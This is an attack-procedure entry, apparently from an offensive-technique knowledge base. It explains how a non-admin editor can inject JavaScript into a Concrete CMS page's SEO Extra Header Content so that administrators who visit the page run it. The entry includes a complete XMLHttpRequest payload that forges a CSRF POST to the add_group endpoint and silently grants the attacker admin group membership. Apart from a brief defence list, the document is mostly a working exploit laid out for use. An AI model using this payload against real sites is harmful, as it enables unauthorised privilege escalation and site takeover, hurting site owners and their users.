---
id: proc-uuid-002
tags:
  - javascript-injection
  - csrf-payload
  - web
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/xmlhttprequest-csrf-add-group]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:03.324Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-into-Page-Header

## Summary

This procedure injects JavaScript into the SEO Extra Header Content of a Concrete CMS page to forge CSRF requests, targeting user group modification endpoints.

## Description

Concrete CMS's SEO module allows arbitrary header content, which can include executable JavaScript. The attacker, as a non-admin with edit access, inserts an XMLHttpRequest script that POSTs to vulnerable endpoints like `/ccm/system/user/add_group`. Prerequisites include edit permissions on the page. Outcomes: Malicious script executes on page load, exploiting admin sessions for privilege changes.

## Requirements

1. Non-admin user with edit access to the target page
2. Knowledge of target site URL, admin group ID (e.g., 3), and user ID (e.g., 8)
3. Browser access to CMS editor

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) to block inline scripts
- Sanitize and escape SEO header inputs
- Log and review all page edits for suspicious JavaScript

## Objectives

1. Embed CSRF-forging JavaScript in page header
2. Target add_group or remove_group endpoints
3. Ensure silent execution on admin visit

## Instructions

### Step 1: Edit the Page

**Context**: Access the page editor as non-admin to reach SEO settings.

**Command** (UI Navigation):

Navigate to the page > Edit > SEO & Statistics > Extra Header Content.

> Opens textarea for header injection.

### Step 2: Insert JavaScript Payload

**Context**: Add the XMLHttpRequest code to send forged POST.

**Command** ([[commands/xmlhttprequest-csrf-add-group]]):
```javascript
var XHR = new XMLHttpRequest(); var urlEncodedData = ''; var urlEncodedDataPairs = []; var name; var data = {gID:'3', uID:'8'}; for(name in data) { urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name])); } urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+'); XHR.addEventListener('load', function(event){}); XHR.addEventListener('error', function(event){}); XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group'); XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); XHR.setRequestHeader('Content-Length', urlEncodedData.length); XHR.send(urlEncodedData);
```

> Script encodes parameters and sends POST; replace placeholders. Expected: No errors, script saved.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/xmlhttprequest-csrf-add-group]]

## Tools Used

- None

## Tags

- [[javascript-injection]]
- [[csrf-payload]]
- [[web]]
